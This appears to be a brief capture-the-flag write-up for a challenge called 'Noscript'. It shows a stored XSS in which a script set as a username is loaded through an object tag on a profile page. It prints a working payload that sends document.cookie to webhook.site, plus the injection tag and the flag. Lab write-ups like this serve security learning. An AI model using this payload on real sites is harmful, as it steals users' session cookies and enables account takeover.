---
created: 2024-06-21T20:15
updated: 2024-06-23T08:43
---

# Noscript

> Ignite it to steal the cookie!

The endpoint `/username/:id` is open and will return plain text username. We can use this for our script payload.

```html
<script>fetch("https://webhook.site",{method:"POST",body:"flag ="+document.cookie})</script>
```

We will then just load it via a object tag in `profile`.

```html
<object data="/username/e2b49e44-9419-4881-8144-72d17223e3f2" type="text/html"></object>
```

```
FLAG{n0scr1p4_c4n_be_d4nger0us}
```